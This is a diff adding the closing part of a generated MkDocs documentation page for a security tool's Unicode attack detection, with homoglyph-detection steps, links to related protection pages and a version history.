+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>   b. If found, record Latin equivalent and position
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>3. Detect mixed-script usage (Latin + Cyrillic in same word)
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>4. Return all homoglyph substitutions
+</code></pre></div>
+<hr />
+<h2 id="see-also">See Also<a class="headerlink" href="#see-also" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="../SSRF_PROTECTION/">SSRF Protection</a> - Network-based attack prevention</li>
+<li><a href="../SECRET_REDACTION/">Secret Redaction</a> - Credential protection</li>
+<li><a href="../CREDENTIAL_EXFILTRATION/">Credential Exfiltration</a> - Config file scanning</li>
+<li><a href="../../CONFIGURATION/">Configuration Guide</a> - Full configuration reference</li>
+</ul>
+<hr />
+<h2 id="version-history">Version History<a class="headerlink" href="#version-history" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>v1.4.0</strong> - Initial Unicode attack detection (zero-width, bidi, homoglyphs)</li>
+<li><strong>v1.5.0</strong> - Added tag character detection and strict mode</li>
+<li><strong>v1.6.0</strong> - Enhanced homoglyph database (80+ pairs), context-aware detection</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.indexes", "navigation.sections", "navigation.top", "search.highlight", "search.suggest"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
